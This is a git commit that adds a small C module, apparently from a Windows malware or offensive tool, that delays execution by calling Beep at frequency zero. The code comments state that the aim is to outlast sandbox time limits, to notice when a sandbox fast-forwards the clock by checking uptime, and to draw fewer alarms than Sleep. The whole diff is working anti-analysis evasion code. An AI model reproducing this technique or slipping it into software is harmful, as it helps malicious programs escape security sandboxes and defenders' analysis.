1618a1e85d5fccf7a9f0c0ebadfc8ce126e1a88e
Hilan Meyran <hilanmeyran@protonmail.com>
2025-02-13 00:57:14 +0100

    delay execution using beep

---
+++ include/delay_execution.h
@@ -0,0 +1,6 @@
+#ifndef DELAY_EXECUTION_H
+#define DELAY_EXECUTION_H
+
+int delay_execution();
+
+#endif
---
+++ src/delay_execution.c
@@ -0,0 +1,21 @@
+#include <windows.h>
+
+// sleep the program to evade sandbox time limit and check if uptime is
+// consistent between the before and after sleep (to detect fast-forwards)
+int delay_execution(int duration) {
+  ULONGLONG uptimeBeforeSleep = GetTickCount64();
+  int frequency = 0;  // 0 should not trigger any actual beeper
+
+  // Calls NtDelayExecution under the hood, we could call it directly, but if it
+  // is hooked we are screwed anyway
+  // And Beep might ring less alarms than Sleep, since it is less common
+  // Upside being that Beep is a lot easier to use
+  Beep(frequency, duration);
+  ULONGLONG uptimeAfterSleep = GetTickCount64();
+
+  // detect fast-fowards
+  if ((uptimeAfterSleep - uptimeBeforeSleep) < duration) {
+    return EXIT_FAILURE;
+  }
+  return EXIT_SUCCESS;
+}
